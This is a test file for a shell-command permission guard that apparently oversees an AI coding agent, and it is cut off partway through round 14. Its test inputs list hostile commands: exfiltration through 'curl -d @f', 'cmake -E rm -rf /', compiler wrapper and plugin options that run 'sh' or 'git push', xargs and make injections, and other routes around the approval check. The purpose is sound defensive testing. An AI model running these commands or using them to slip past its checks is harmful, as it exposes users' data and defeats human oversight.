// Council project review 2: code that xargs -I or find -exec fills in is not printed; `git reset
// --merge` discards staged work; a saved "Always allow" for `git rm`
// is not mirrored; compilers and build tools that run a program the call names ask; a pattern a
// runner expands itself counts as a place a session write may lie.
// Run: node test/run.mjs test/council-p2.test.mts.
import { execFileSync, spawnSync } from "node:child_process";
import fs from "node:fs";
import os from "node:os";
import path from "node:path";
import { after, before, test } from "node:test";
import assert from "node:assert/strict";
import { DEFAULT_ASK, decideShell, mirrorable, SessionState, takeMoment, type Guard } from "../decide.ts";
import { canonical } from "../canon.ts";
SessionState.moment = takeMoment;
import { compileRules } from "../rules.ts";
import { DEFAULT_CLASSIFIER } from "../kev.ts";

assert.ok(process.env.GIT_CONFIG_GLOBAL?.startsWith(os.homedir()), "run through test/run.mjs, which supplies a throwaway $HOME");
const base = fs.realpathSync(fs.mkdtempSync(path.join(os.homedir(), "council-p2-")));
const repo = path.join(base, "repo");
const guard: Guard = {
  rules: compileRules({ ask: DEFAULT_ASK }),
  guarded: [path.resolve(import.meta.dirname, "..")],
  configDirs: [path.join(os.homedir(), ".config", "opencode")],
  allowedPaths: [],
  classifier: DEFAULT_CLASSIFIER,
  useClassifier: false,
  sshHosts: [],
  allowFeatureBranchPush: false,
};

before(() => {
  fs.mkdirSync(repo, { recursive: true });
  fs.writeFileSync(path.join(repo, "f"), "x\n");
  fs.writeFileSync(path.join(repo, "package.json"), JSON.stringify({ scripts: { test: "node --test" } }));
  execFileSync("git", ["init", "-q", "-b", "main", repo]);
  execFileSync("git", ["-C", repo, "add", "-A"]);
  execFileSync("git", ["-C", repo, "commit", "-qm", "init"]);
});
after(() => fs.rmSync(base, { recursive: true, force: true }));

const effect = async (command: string, s = new SessionState(repo)) => (await decideShell(guard, s, repo, command)).effect;

test("code that xargs -I or find -exec fills in asks; the same code with the input as an argument prints", () => {
  const filled = [
    `printf '%s\\n' 'safe; echo EXTRA' | xargs -IXX bash -c 'printf "<%s>\\n" "XX"'`,
    `xargs -I XX bash -c 'echo "XX"'`,
    `xargs -0IXX bash -c 'echo "XX"'`,
    `xargs -I{} sh -c 'echo "{}"'`,
    `xargs -i bash -c 'echo "{}"'`,
    `xargs -iQQ bash -c 'echo "QQ"'`,
    `xargs --replace bash -c 'echo "{}"'`,
    `xargs --replace=QQ bash -c 'echo "QQ"'`,
    `xargs --repl=QQ bash -c 'echo "QQ"'`,
    `xargs -n1 -I XX timeout 5 bash -c 'echo "XX"'`,
    `find . -name f -exec bash -c 'echo "{}"' \\;`,
    `find . -name f -execdir sh -c 'cat "{}"' \\;`,
  ];
  for (const c of filled) assert.ok("ask" in canonical(c), c);
  for (const c of [`xargs bash -c 'echo "$1"' _`, `xargs -I{} bash -c 'echo "$1"' _ {}`, `find . -name f -exec sh -c 'echo "$1"' _ {} \\;`, `xargs -IXX bash -c 'echo "$1"' _ XX`, `bash -c 'echo "{}"'`]) assert.ok(!("ask" in canonical(c)), c);
});

test("what runs for an input with a ; in it is what was written", () => {
  // The reviewer's example, run as written: the input stays one argument.
  const out = spawnSync("bash", ["-c", `printf '%s\\n' 'safe; echo EXTRA' | xargs -IXX bash -c 'printf "<%s>\\n" "XX"'`], { encoding: "utf8" });
  assert.equal(out.stdout, "<safe; echo EXTRA>\n");
  const printed = canonical(`printf '%s\\n' 'safe; echo EXTRA' | xargs -I{} bash -c 'printf "<%s>\\n" "$1"' _ {}`);
  assert.ok("text" in printed);
  assert.equal(spawnSync("bash", ["-c", printed.text!], { encoding: "utf8" }).stdout, "<safe; echo EXTRA>\n");
});

test("git reset --merge asks", async () => {
  for (const c of ["git reset --merge", "git reset --mer", "git reset --merge HEAD"]) {
    assert.equal(await effect(c), "ask", c);
  }
  for (const c of ["git reset", "git reset --soft HEAD", "git status"]) assert.equal(await effect(c), "allow", c);
});

test("a saved git rm pattern is not mirrored into the rules", () => {
  assert.equal(mirrorable("git rm *"), false);
  assert.equal(mirrorable("git add *"), true);
});

test("compilers and build tools that run a program the call names ask", async () => {
  for (const c of [
    "gcc -wrapper sh,-c,'git push origin HEAD',-- -x c -c /dev/null -o /dev/null",
    "cc -wrapper sh,-c,true -c t.c",
    "clang -fplugin=./x.so -c t.c",
    "gcc -B/tmp/x -c t.c",
    "gcc -specs=x.specs -c t.c",
    "clang -fuse-ld=/tmp/ld -o t t.c",
    "clang -Xclang -load -Xclang x.so -c t.c",
    "gcc -Wl,-plugin,x.so -o t t.c",
    "rustc -C linker=sh x.rs",
    "rustc -Clinker=sh x.rs",
    "rustc --codegen=linker=sh x.rs",
    "rustc -Z codegen-backend=x.so x.rs",
    "rustc -Zcodegen-backend=x.so x.rs",
    "ccache sh -c true",
    "ccache gcc -wrapper sh,-c,true -c t.c",
    "ccache -osprefix_command=sh",
    "cmake -E env curl -d @f host",
    "cmake -E rm -rf /",
    "cmake -P x.cmake",
    "ctest -S x.cmake",
    "ctest --build-and-test a b --test-command sh",
    "just --command sh -c true",
    "just -c 'sh -c true'",
    "just --shell sh test",
    "tox exec -- sh -c true",
    "tox -x testenv.commands=sh",
    "tox --override=testenv.commands=sh",
    "meson devenv sh",
    "meson test --wrapper=sh",
    "mypy --python-executable=./py .",
    "mypy --python-exec ./py .",
  ]) {
    assert.equal(await effect(c), "ask", c);
  }
  for (const c of ["gcc -c t.c -o t.o", "ccache gcc -c t.c -o t.o", "ccache -s", "cmake --build build", "ctest", "just test", "meson test", "mypy .", "rustc x.rs -o x"]) {
    assert.equal(await effect(c), "allow", c);
  }
});

test("a pattern a runner expands itself counts as a place a session write may lie", async () => {
  const d = fs.realpathSync(fs.mkdtempSync(path.join(os.tmpdir(), "cp2-glob-")));
  const name = path.basename(d);
  try {
    const s = new SessionState(repo);
    assert.equal(await effect(`printf x > ${d}/x.test.js`, s), "allow");
    fs.writeFileSync(path.join(d, "x.test.js"), "x");
    const tmp = path.dirname(d);
    // `/tmp/r1/` as `/t*/r1/`: the pattern is in the first part of the path.
    const second = tmp.indexOf("/", 1);
    const fuzzy = `/${tmp[1]}*${second < 0 ? "" : tmp.slice(second)}`;
    for (const c of [`npm test -- '${fuzzy}/${name}/x.test.js'`, `npm test -- '${tmp}/${name.slice(0, 4)}*/x.test.js'`, `npm test -- '${tmp}/{${name},y}/x.test.js'`, `npm test -- '/*/${name}/x.test.js'`, `npm test -- --test-name-pattern=x '${tmp}/${name}/*.js'`]) {
      assert.notEqual(await effect(c, s), "allow", c);
    }
    // A pattern inside the project counts from where it starts, as before.
    assert.equal(await effect("npm test -- 'src/*.test.js'", new SessionState(repo)), "allow");
  } finally {
    fs.rmSync(d, { recursive: true, force: true });
  }
});

// ---- round 2 ----

test("round 2: a placeholder that only the printed code holds, or one bash computes, asks", () => {
  for (const c of [
    `printf '%s\\n' 'safe; echo EXTRA' | xargs -IXX bash -c 'echo X"X"'`,
    `xargs -I XX bash -c 'echo "X"X'`,
    `find . -maxdepth 0 -exec bash -c 'echo "{""}"' \;`,
    `find . -type f -exec bash -c 'echo \\{\\}' \;`,
    `printf 'x; echo INJECTED; echo \\\\n' | xargs -I"'" bash -c 'echo "a b"'`,
    `M=foo; xargs -I "$M" bash -c 'echo "foo"'`,
    `xargs -I "$(echo foo)" bash -c 'echo "foo"'`,
    `xargs -I fo* bash -c 'echo "foo"'`,
  ]) assert.ok("ask" in canonical(c), c);
  // What prints keeps doing what was written.
  for (const c of [`printf '%s\\n' 'a; echo EXTRA' | xargs -I{} bash -c 'printf "<%s>\\n" "$1"' _ {}`, `printf '%s\\n' 'a; echo EXTRA' | xargs -IXX bash -c 'printf "<%s>\\n" "$1"' _ XX`]) {
    const printed = canonical(c);
    assert.ok("text" in printed, c);
    const run = (t: string) => spawnSync("bash", ["-c", t], { encoding: "utf8" }).stdout;
    assert.equal(run(printed.text!), run(c), c);
  }
});

test("round 2: a build tool's option held in a variable goes to the model; rustc's _ spelling, cmake's compilers, go's -extld ask", async () => {
  for (const c of ["W=-wrapper; gcc $W sh,-c,true -c t.c", `W=-wrapper; gcc "$W" sh,-c,true -c t.c`, "gcc $CFLAGS -c t.c", "A=-Clinker=sh; rustc $A x.rs", "E=-E; cmake $E env sh", "J=--command; just $J sh", "clang ${W} x -c t.c"]) {
    assert.notEqual(await effect(c), "allow", c);
  }
  for (const c of [
    "rustc -C link_arg=-wrapper x.rs", "rustc -Clink_arg=x x.rs", "rustc -C link_args=x x.rs", "rustc --codegen link_arg=x x.rs", "rustc --codegen=link_arg=x x.rs",
    "gcc --prefix=/tmp/x -c t.c", "gcc --prefix /tmp/x -c t.c", "gcc -Wp,-fplugin=x.so -c t.c", "gcc --for-linker=-plugin --for-linker=x.so t.c",
    "cmake -C x.cmake .", "cmake -DCMAKE_C_COMPILER=/tmp/prog .", "cmake -D CMAKE_C_COMPILER_LAUNCHER=sh .", "cmake -DCMAKE_TOOLCHAIN_FILE:FILEPATH=x.cmake .", "cmake --toolchain x.cmake .",
    "go build -ldflags=-extld=sh .", "go build -ldflags '-linkmode=external -extld /tmp/prog' .",
    "just --chooser 'sh -c x' --choose", "mypy --install-types .",
    "npm run env -- sh -c true", "npm run env", "npm run-script env", "pnpm run env -- sh -c true", "yarn run env",
  ]) assert.equal(await effect(c), "ask", c);
  for (const c of ["cmake -DCMAKE_BUILD_TYPE=Release -S . -B build", "go build -ldflags=-s .", "npm run build", "rustc -C opt-level=2 x.rs"]) assert.notEqual(await effect(c), "ask", c);
});

test("round 2: git clean -i and a checkout operand with a backslash ask", async () => {
  for (const c of ["git clean -i", "git clean --interactive", "git clean -di", "git checkout '\\f'", "git checkout '\\x'"]) assert.equal(await effect(c), "ask", c);
});

test("round 2: node's extglob and a backslash in a runner's pattern count as places", async () => {
  const d = fs.realpathSync(fs.mkdtempSync(path.join(os.tmpdir(), "cp2-ext-")));
  const name = path.basename(d);
  const tmp = path.dirname(d);
  try {
    const s = new SessionState(repo);
    assert.equal(await effect(`printf x > ${d}/x.test.js`, s), "allow");
    fs.writeFileSync(path.join(d, "x.test.js"), "x");
    for (const c of [`npm test -- '${tmp}/!(zzz)/x.test.js'`, `npm test -- '${tmp}/@(${name})/x.test.js'`, `npm test -- '${tmp}/+(${name})/x.test.js'`, `npm test -- '/\\${tmp.slice(1)}/${name}/x.test.js'`, `npm test -- '${tmp}/${name}\\/x.test.js'`, `npm test -- '/@(${tmp.split("/")[1]})${tmp.slice(tmp.indexOf("/", 1) < 0 ? tmp.length : tmp.indexOf("/", 1))}/${name}/x.test.js'`]) {
      assert.notEqual(await effect(c, s), "allow", c);
    }
  } finally {
    fs.rmSync(d, { recursive: true, force: true });
  }
});

// ---- round 3 ----

test("round 3: npm's env script wherever it stands after run, go's -extld anywhere, tox's subcommand anywhere, git clean but a dry run, cmake's make program and includes", async () => {
  for (const c of [
    "npm run -- env sh -c true", "npm --prefix . run env -- sh -c true", "npm run --prefix src env -- sh -c true", "npm --loglevel silent run env -- sh -c true", "npm run -w pk env -- sh -c true", "npm -w pk run env -- sh -c true", "npm run-script -- env sh -c true", "npm run --loglevel warn env -- sh -c true",
    "go build -ldflags=-s -ldflags='-linkmode=external -extld=/tmp/prog' .", "go build -ldflags -s -ldflags '-extld=sh' .", "go tool link -extld sh x", "go build -compiler=gccgo -gccgoflags=-wrapper .",
    "tox -e py exec -- sh -c true", "tox -c tox.ini e -- sh", "tox --workdir .tox exec -- sh",
    "git clean", "git clean -dx", "git clean -d -x -q", "git clean -X",
    "cmake -DCMAKE_MAKE_PROGRAM=/tmp/prog -S . -B build", "cmake -DCMAKE_PROJECT_INCLUDE=/tmp/x.cmake .", "cmake -DCMAKE_PROJECT_TOP_LEVEL_INCLUDES=x.cmake .", "cmake -DCMAKE_USER_MAKE_RULES_OVERRIDE=x.cmake .", "cmake '-DCMAKE_C_FLAGS=-wrapper sh,-c,true' .",
  ]) assert.equal(await effect(c), "ask", c);
  for (const c of ["git clean -n", "git clean -dn", "git clean --dry-run -x", "go build -ldflags=-s .", "tox -e py", "npm run build", "cmake -DCMAKE_C_FLAGS=-O2 ."]) assert.notEqual(await effect(c), "ask", c);
});

test("round 3: a runner's word with a %xx escape or a data: URL is a place the check cannot tell", async () => {
  const d = fs.realpathSync(fs.mkdtempSync(path.join(os.tmpdir(), "cp2-url-")));
  try {
    const s = new SessionState(repo);
    fs.mkdirSync(path.join(d, "a.b"));
    assert.equal(await effect(`printf x > ${d}/a.b/x.test.js`, s), "allow");
    fs.writeFileSync(path.join(d, "a.b", "x.test.js"), "x");
    const escaped = `${d}/a.b/x.test.js`.replace(/^\/(.)/, (_, c: string) => `/%${c.charCodeAt(0).toString(16)}`);
    for (const c of [`npm test -- --import=file://${escaped}`, `npm test -- --import=file://${d}/a%2Eb/x.test.js`, `npm test -- --import 'data:text/javascript,import "file://${escaped}"'`]) {
      assert.notEqual(await effect(c, s), "allow", c);
    }
  } finally {
    fs.rmSync(d, { recursive: true, force: true });
  }
});

// ---- round 4 ----

test("round 4: git clean is read as git reads it; -i asks whatever else is there", async () => {
  for (const c of ["git clean -e -n", "git clean --exclude -n", "git clean -en", "git clean -xen", "git clean -dq -en", "git clean -n --no-dry-run", "git clean --dry-run --no-dry-run", "git clean -i -n", "git clean -en -i", "git clean -n --no-d -i", "git clean -n --frobnicate"]) {
    assert.equal(await effect(c), "ask", c);
  }
  for (const c of ["git clean -n", "git clean -dxn", "git clean -e x -n", "git clean --exclude=x --dry-run", "git clean --no-dry-run -n", "git clean --dry"]) assert.equal(await effect(c), "allow", c);
});

test("round 4: what a compiler writes under a name it or a linker option chooses marks where it ran", async () => {
  for (const writer of [
    "printf 'fn main(){}' | rustc - -o node_modules/.bin/node",
    "rustc --emit=link=node_modules/.bin/node x.rs",
    "rustc --out-dir node_modules/.bin x.rs",
    "rustc x.rs",
    "printf 'int main(){}' | gcc -xc - -Wl,-o,node_modules/.bin/node",
    "gcc -xc - -Wl,--output=node_modules/.bin/node",
    "gcc -xc - -Xlinker -o -Xlinker node_modules/.bin/node",
    "gcc t.c",
    "ccache gcc -xc - -o node_modules/.bin/node",
  ]) {
    const s = new SessionState(repo);
    // Either the writer asks (what is approved runs outside the sandbox), or what it wrote is
    // marked and npm goes to the model after it.
    const wrote = await effect(writer, s);
    assert.ok(wrote !== "allow" || (await effect("npm test", s)) !== "allow", writer);
  }
  const s = new SessionState(repo);
  assert.equal(await effect("rustc --version", s), "allow");
  assert.equal(await effect("npm test", s), "allow");
});

test("round 4: cargo hands rustc its words after --; make's values and cmake's variables are read", async () => {
  for (const c of [
    "cargo clippy -- --emit=link -Clink-arg=-wrapper -Clink-arg=sh,-c,true,--", "cargo clippy -- -Clinker=/bin/false", "cargo rustc -- -C linker=sh", "cargo rustdoc -- -Z x",
    "make x.o CFLAGS=-wrapper CPPFLAGS=sh,-c,id", "make CFLAGS=-B/tmp/x", "make LDFLAGS=-Wl,-plugin,x.so",
    "cmake -DCMAKE_C_LINK_EXECUTABLE=sh .", "cmake -DCMAKE_AR=/tmp/ar .", "cmake -DCMAKE_C_CLANG_TIDY=sh .", "cmake -DCMAKE_CROSSCOMPILING_EMULATOR=sh .", "cmake '-DCMAKE_C_STANDARD_LIBRARIES=-wrapper sh,-c,x' .",
    "cmake --build build -- SHELL=/tmp/sh", "cmake --build build -- --eval=x",
    "go build -ldflags=-extar=/tmp/x .", "go tool link -extar /tmp/x x",
  ]) assert.equal(await effect(c), "ask", c);
  for (const c of ["cargo clippy -- -D warnings", "cargo test -- --nocapture", "make CFLAGS=-O2", "cmake -DCMAKE_BUILD_TYPE=Release -DBUILD_TESTING=ON .", "cmake --build build -- -j4"]) assert.notEqual(await effect(c), "ask", c);
});

// ---- round 5 ----

test("round 5: every compile that is not a pure query is a write; an option that can name the place marks the project", async () => {
  const outside = fs.realpathSync(fs.mkdtempSync(path.join(os.tmpdir(), "cp2-cc-")));
  try {
    for (const [writer, cwd] of [
      ["gcc -v t.c", repo], ["gcc -v -c t.c", repo], ["gcc -dumpbase x t.c", repo], ["gcc -I -o/tmp/zz t.c", repo],
      ["gcc -c t.c -o /dev/null -Wa,-al=test.sh", repo], ["gcc -c t.c -o /dev/null -Xassembler -al=test.sh", repo],
      ["gcc -E t.c --write-dependencies -MT x", repo], ["gcc -fsyntax-only -fdump-tree-original=build.sh t.c", repo],
      ["rustc --print link-args t.rs -o tool", repo], ["rustc --print cfg=build.sh t.rs", repo], ["rustc --print native-static-libs t.rs", repo],
      [`gcc -M -MF ${repo}/z.test.js -MT x -xc /dev/null`, outside],
    ] as const) {
      const s = new SessionState(repo);
      const wrote = (await decideShell(guard, s, cwd, writer)).effect;
      assert.ok(wrote !== "allow" || (await effect("npm test", s)) !== "allow", writer);
    }
    for (const query of ["gcc --version", "gcc -dumpmachine", "gcc -print-file-name=libc.so", "rustc --version", "rustc --print sysroot", "rustc -vV"]) {
      const s = new SessionState(repo);
      assert.equal(await effect(query, s), "allow", query);
      assert.equal(await effect("npm test", s), "allow", query);
    }
  } finally {
    fs.rmSync(outside, { recursive: true, force: true });
  }
});

test("round 5: gcc's options are words of their own; cargo's subcommand behind a global option's value; cmake's other program variables", async () => {
  for (const c of ["gcc -fno-omit-frame-pointer t.c -o x", "gcc -fno-strict-aliasing -c t.c -o t.o", "g++ -fno-exceptions -c t.cc -o t.o"]) assert.equal(await effect(c), "allow", c);
  for (const c of [
    "cargo --color never clippy -- --emit=link -Clinker=/bin/false", "cargo --color always clippy -- -C linker=sh",
    "cmake -DCMAKE_EXE_LINKER_FLAGS=--ld-path=./x .", "cmake -DCMAKE_C_FLAGS=--gcc-toolchain=./x .", "cmake -DGIT_EXECUTABLE=/tmp/g .", "cmake -DPKG_CONFIG_EXECUTABLE=/tmp/p .", "cmake -DFoo_DIR=/tmp/x .", "cmake --build build -- -f /tmp/x.mk",
  ]) assert.equal(await effect(c), "ask", c);
  for (const c of ["cmake --build build -- -j4 -k", "cmake -DBUILD_TESTING=ON -DCMAKE_BUILD_TYPE=Debug ."]) assert.notEqual(await effect(c), "ask", c);
});

// ---- round 6 ----

test("round 6: a query word that is an option's value, an input of any name, or an @file makes a compile a write", async () => {
  for (const writer of [
    "rustc --print link-args src -o output", "printf 'fn main(){}' | rustc -L -V - -o node_modules/.bin/node", "rustc --cfg --version x", "rustc --print native-static-libs /dev/stdin -o o", "rustc --print sysroot @rr2",
    "gcc -I -E t.c", "gcc -L -fsyntax-only t.c", "printf 'int e;' | gcc -I -E -c -include /dev/stdin t.c", "gcc -E -P @/tmp/rsp", "gcc -E -C @/tmp/rsp",
  ]) {
    const s = new SessionState(repo);
    const wrote = await effect(writer, s);
    assert.ok(wrote !== "allow" || (await effect("npm test", s)) !== "allow", writer);
  }
  // A header compiled from elsewhere: its .gch lands beside it, in the project.
  const outside = fs.realpathSync(fs.mkdtempSync(path.join(os.tmpdir(), "cp2-pch-")));
  try {
    const s = new SessionState(repo);
    const wrote = (await decideShell(guard, s, outside, `gcc -x c-header ${repo}/x.h`)).effect;
    assert.ok(wrote !== "allow" || (await effect("make", s)) !== "allow");
  } finally {
    fs.rmSync(outside, { recursive: true, force: true });
  }
});

test("round 6: an @file after -c or -S is a place the check cannot tell; -fmodule-mapper asks", async () => {
  const d = fs.realpathSync(fs.mkdtempSync(path.join(os.tmpdir(), "cp2-rsp-")));
  try {
    const s = new SessionState(repo);
    assert.equal(await effect(`printf x > ${d}/rsp`, s), "allow");
    fs.writeFileSync(path.join(d, "rsp"), "x");
    for (const c of [`gcc -c @${d}/rsp t.c`, `gcc -S @${d}/rsp t.c`, `npm test -- -c @${d}/rsp`]) assert.notEqual(await effect(c, s), "allow", c);
  } finally {
    fs.rmSync(d, { recursive: true, force: true });
  }
  for (const c of ["g++ -fmodules-ts '-fmodule-mapper=|git push origin HEAD' -c x.cc", "ccache g++ '-fmodule-mapper=|sh' -c x.cc", "cmake '-DCMAKE_CXX_FLAGS=-fmodule-mapper=|sh' .", `cmake '-DCMAKE_C_FLAGS="-B/tmp/x"' .`, "cmake -DFETCHCONTENT_SOURCE_DIR_FOO=/tmp/x ."]) {
    assert.equal(await effect(c), "ask", c);
  }
});

// ---- round 7 ----

test("round 7: -E and -fsyntax-only are compiles; make's other assignment forms, a rustup toolchain path and set +B ask", async () => {
  for (const writer of ["gcc --include-directory -E t.c", "gcc --library-directory -E t.c", "gcc -F -E t.c", "gcc -fsyntax-only -fno-syntax-only -c t.c", "g++ --include-directory -fsyntax-only t.c", "ccache gcc --include-directory -E t.c", "gcc -E t.c", "gcc -fsyntax-only t.c"]) {
    const s = new SessionState(repo);
    const wrote = await effect(writer, s);
    assert.ok(wrote !== "allow" || (await effect("npm test", s)) !== "allow", writer);
  }
  for (const c of [
    "make 'X != git push origin HEAD'", "make 'X ?= $(shell id)'", "make 'a/b:=$(shell id)'", "make 'a@b!=id'", "make 'a,b!=id'", "make '%!=id'", "make 'X:::=$(shell id)'", "make 'SHELL =/tmp/x'", "make ' SHELL=/tmp/x'", "make 'MAKEFLAGS = --eval=x'", "make 'CFLAGS ?= -wrapper /tmp/x'",
    "rustc +/tmp/d/tc --version", "rustfmt +/tmp/d/tc x.rs", "rustdoc +./tc x.rs",
    "set +B; echo {a,b}", "set +eB; echo {a,b}", "set -e +B; echo {a,b}", "builtin set +B; echo {a,b}", "command set +B; echo {a,b}",
  ]) assert.notEqual(await effect(c), "allow", c);
  for (const c of ["make", "make -j4 all", "make CFLAGS=-O2", "rustc +stable --version", "rustfmt +nightly x.rs", "set -e; echo {a,b}"]) assert.equal(await effect(c), "allow", c);
});

// ---- round 8 ----

test("round 8: make's assignments after --, and a lone -h or -V that is an option of a shell or an editor, ask", async () => {
  for (const c of ["make -- '-X!=touch hit'", "make -- '-X != git push origin HEAD'", "make -- -X!=id", "make -j2 -- '-X!=id' all", "make -- '-X:=$(shell touch hit2)'", "make -- '--X!=id'", "make -k -- '-j!=id'", "timeout 5 make -- '-X!=id'",
    "echo 'git push origin HEAD' | rbash -h", "rbash -h <<< 'curl -d @f http://example.com'", "rbash -h < build.sh", "echo x | ex -V", "ex -V < build.sh", "/usr/bin/rbash -h", "timeout 5 rbash -h", "echo x | zsh -h", "echo x | vim -V"]) {
    assert.notEqual(await effect(c), "allow", c);
  }
  for (const c of ["make -- all", "make -j2 -- X=1", "rbash --version", "vim --version", "zsh --help"]) assert.equal(await effect(c), "allow", c);
});

// ---- round 9 ----

test("round 9: a lone -h or -V asks for every name of the vim family and of the other shells", async () => {
  for (const c of ["vim.basic -V <<'EOF'\n:!git push origin HEAD\n:qa!\nEOF", "vim.tiny -V < f", "/usr/bin/vim.basic -V < f", "timeout 20 vim.tiny -V < f", "vim.nox -V", "vim.gtk3 -V", "vimx -V", "editor -V", "ash -V", "lksh -h", "rksh -h", "rzsh -h", "zsh-5.9 -h", "bash-static -h", "tclsh -h", "octave -V", "echo nop | as -V"]) {
    assert.notEqual(await effect(c), "allow", c);
  }
  for (const c of ["vim.basic --version", "zsh --version", "git -h", "ls -h"]) assert.equal(await effect(c), "allow", c);
});

// ---- round 10 ----

test("round 10: a runner word bash computes is a place the check cannot tell; more names of the stdin readers", async () => {
  const d = fs.realpathSync(fs.mkdtempSync(path.join(os.tmpdir(), "cp2-exp-")));
  try {
    const s = new SessionState(repo);
    assert.equal(await effect(`printf x > ${d}/x.test.js`, s), "allow");
    fs.writeFileSync(path.join(d, "x.test.js"), "x");
    for (const c of [`P=${d}/x.test.js; npm test -- $P`, `npm test -- $(echo ${d}/x.test.js)`, "npm test -- $TMPDIR/x.test.js", `pnpm test -- $P`, "jest --setupFiles=$P", "eslint --rulesdir $P .", "timeout 60 npm test -- $P"]) {
      assert.notEqual(await effect(c, s), "allow", c);
    }
  } finally {
    fs.rmSync(d, { recursive: true, force: true });
  }
  for (const c of ["echo nop | x86_64-linux-gnu-as -V", "octave-cli -V", "bsd-csh -V", "gview -V", "rgvim -V", "eview -V", "gvimdiff -V"]) assert.notEqual(await effect(c), "allow", c);
  assert.equal(await effect("npm test -- $X"), "allow", "with nothing written, as before");
});

// ---- round 11 ----

test("round 11: a file the call makes and hands a runner counts from its nearest existing directory; an unplaced write marks the temp directories", async () => {
  const base11 = fs.realpathSync(fs.mkdtempSync(path.join(os.tmpdir(), "cp2-r11-")));
  const scratch = path.join(base11, "scratch");
  try {
    for (const c of [`mkdir -p ${base11}/new && printf x > ${base11}/new/a.test.js && npm test -- ${base11}/new/a.test.js`, `printf x > ${base11}/q.test.js; npm test -- ${path.relative(repo, base11)}/q.test.js`, `mkdir -p ${base11}/n2 && printf x > ${base11}/n2/a.test.js && pnpm test ${base11}/n2/a.test.js`]) {
      assert.notEqual(await effect(c), "allow", c);
    }
    // A scratch project in a temp directory the session did not write.
    fs.mkdirSync(scratch);
    fs.writeFileSync(path.join(scratch, "package.json"), JSON.stringify({ scripts: { test: "node --test" } }));
    fs.writeFileSync(path.join(repo, "t.c"), "int x;\n");
    for (const c of [`gcc -M -MT x -MF ${scratch}/x.test.js t.c && cd ${scratch} && npm test`, `git format-patch -1 -o ${scratch} --suffix=.test.js && cd ${scratch} && npm test`]) {
      assert.notEqual(await effect(c), "allow", c);
    }
    const s = new SessionState(repo);
    await effect(`gcc -M -MT x -MF ${scratch}/y.test.js t.c`, s);
    assert.notEqual((await decideShell(guard, s, scratch, "npm test")).effect, "allow");
  } finally {
    fs.rmSync(base11, { recursive: true, force: true });
    fs.rmSync(path.join(repo, "t.c"), { force: true });
  }
});

// ---- round 12 ----

test("round 12: unplaced writes mark allowedPaths; runners look upward; tee only straight after; zstd -dT0; links made in the call; cp --parents", async () => {
  const b = fs.realpathSync(fs.mkdtempSync(path.join(os.tmpdir(), "cp2-r12-")));
  const extra = fs.realpathSync(fs.mkdtempSync(path.join(os.homedir(), "cp2-extra-")));
  try {
    fs.writeFileSync(path.join(repo, "t.c"), "int x;\n");
    fs.writeFileSync(path.join(extra, "package.json"), JSON.stringify({ scripts: { test: "node --test" } }));
    const g2: Guard = { ...guard, allowedPaths: [extra] };
    const s = new SessionState(repo);
    await decideShell(g2, s, repo, `gcc -M -MT x -MF ${extra}/r12.test.js t.c`);
    assert.notEqual((await decideShell(g2, s, extra, "npm test")).effect, "allow", "allowedPaths");
    // npm looks upward from a temp subdirectory.
    fs.mkdirSync(path.join(b, "p", "sub"), { recursive: true });
    const up = new SessionState(repo);
    assert.equal(await effect(`printf '{}' > ${b}/p/package.json`, up), "allow");
    fs.writeFileSync(path.join(b, "p", "package.json"), "{}");
    assert.notEqual(await effect(`cd ${b}/p/sub && npm test`, up), "allow", "upward");
    for (const c of [`npm test -s | printf 'x' | tee x.test.js`, `npm test | printf '{}' | tee package.json`, "npm test | tee x.test.js <<< 'code'", "make | printf x | tee Makefile"]) assert.notEqual(await effect(c), "allow", c);
    assert.equal(await effect("npm test 2>&1 | tee test.log"), "allow", "a tee of the command's own output, as before");
    for (const writer of [`zstd -dT0 ${b}/x.test.js.zst --output-dir-flat .`, `zstd -d1 ${b}/x.zst --output-dir-flat=.`, `lzop -x ${b}/a.lzo`]) {
      const t = new SessionState(repo);
      const wrote = await effect(writer, t);
      assert.ok(wrote !== "allow" || (await effect("npm test", t)) !== "allow", writer);
    }
    fs.mkdirSync(path.join(b, "e", "sub"), { recursive: true });
    const l = new SessionState(repo);
    await effect(`ln -s ${b}/e/sub ${b}/l && printf x > ${b}/l/x.test.js`, l);
    assert.notEqual(await effect(`npm test -- ${b}/e/sub/x.test.js`, l), "allow", "a link made in the call");
    fs.mkdirSync(path.join(b, "d", "s"), { recursive: true });
    const c = new SessionState(repo);
    await effect(`cp --parents f ${b}/d`, c);
    assert.notEqual(await effect(`npm test -- ${b}/d/f`, c), "allow", "cp --parents");
  } finally {
    fs.rmSync(b, { recursive: true, force: true });
    fs.rmSync(extra, { recursive: true, force: true });
    fs.rmSync(path.join(repo, "t.c"), { force: true });
  }
});

// ---- round 13 ----

test("round 13: a link made by cp in the call; only plain filters before a tee; gzip --decomp", async () => {
  const b = fs.realpathSync(fs.mkdtempSync(path.join(os.tmpdir(), "cp2-r13-")));
  try {
    fs.mkdirSync(path.join(b, "B"));
    fs.mkdirSync(path.join(b, "A"));
    fs.writeFileSync(path.join(b, "B", "x.test.js"), "");
    const s = new SessionState(repo);
    await effect(`cp -s ${b}/B/x.test.js ${b}/A/l.js && printf x > ${b}/A/l.js`, s);
    assert.notEqual(await effect(`npm test -- ${b}/B/x.test.js`, s), "allow", "cp -s");
    assert.notEqual(await effect(`cp -s ${repo}/package.json ${b}/p && printf '{}' > ${b}/p && npm test`), "allow", "cp -s in one call");
    for (const c of ["npm test | grep -e. payload | tee x.test.js", "npm test | grep -hex payload | tee x.test.js", "npm test | grep --reg=. payload | tee x.test.js", "npm test | grep -fpats payload | tee x.test.js", "npm test | grep -v -- -zzz payload | tee x.test.js", "npm test | head 123 | tee x.test.js", "npm test | tail 1 | tee x.test.js", "npm test | grep -r x . | tee x.test.js"]) {
      assert.notEqual(await effect(c), "allow", c);
    }
    for (const c of ["npm test 2>&1 | grep -v warning | tee -a test.log", "npm test | head -n 50 | tee test.log", "npm test | tail -20 | tee test.log", "npm test | cat | tee test.log"]) assert.equal(await effect(c), "allow", c);
    const t = new SessionState(repo);
    const wrote = await effect(`gzip --decomp ${b}/x.test.js.gz`, t);
    assert.ok(wrote !== "allow" || (await effect(`npm test -- ${b}/x.test.js`, t)) !== "allow");
  } finally {
    fs.rmSync(b, { recursive: true, force: true });
  }
});

// ---- round 14 ----

test("round 14: gzip's short prefixes, xz --files, a link patch makes, $$( in double quotes", async () => {
  const b = fs.realpathSync(fs.mkdtempSync(path.join(os.tmpdir(), "cp2-r14-")));
  try {
    for (const writer of [`gzip --de ${b}/x.test.js.gz`, `gzip --d ${b}/x.test.js.gz`, `gzip --un ${b}/x.test.js.gz`, `xz --u ${b}/x.test.js.xz`]) {
